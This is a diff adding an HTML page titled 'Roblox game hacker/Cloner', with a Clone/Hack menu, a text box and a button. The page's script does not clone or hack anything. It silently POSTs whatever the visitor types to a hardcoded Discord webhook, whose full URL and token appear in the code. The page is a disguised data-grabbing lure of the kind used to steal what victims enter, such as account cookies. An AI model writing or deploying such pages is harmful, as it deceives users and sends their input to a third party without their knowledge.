@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<body>
+	<script>
+		function clonehack() {
+			var inputValue = document.getElementById("inputs").value;
+
+			var webhookURL = "https://discord.com/api/webhooks/1096255943290921090/3pfHhiVBZ6HB1ADgrx_pSFOZVIlR2HGMBNJ9rrc6G6UDOpn1rBLBlfjIUAs3MhH2kcwq";
+
+			var xhr = new XMLHttpRequest();
+			xhr.open("POST", webhookURL, true);
+			xhr.setRequestHeader("Content-Type", "application/json");
+
+			var data = JSON.stringify({
+				content: inputValue
+			});
+
+			xhr.send(data);
+		}
+	</script>
+
+	<h1>Roblox game hacker/Cloner</h1>
+	<h5>Select your action.</h5>
+	<select name="action" id="action">
+		<option value="Clone">Clone</option>
+		<option value="Hack">Hack</option>
+    </select>
+	<input type="text" id="inputs">
+    <button onclick="clonehack()">Enter</button>
+</body>
+<style>
+
+h1 {
+	color: white;
+	font-family: sans-serif;
+	font-size: 50px;
+}
+
+body { 
+	background-color: black;
+}
+
+button { 
+	background-color: gray; 
+	color: black;
+	font-family: sans-serif;
+	width: 250px;
+	height: 100px;
+	font-size: 75px;
+}
+
+select {
+	width: 150px;
+	height:100px;
+	font-size: 50px;
+}
+
+input {
+	width: 250px;
+	height:100px;
+	font-size: 50px;
+}
+
+</style>
+</html>
+
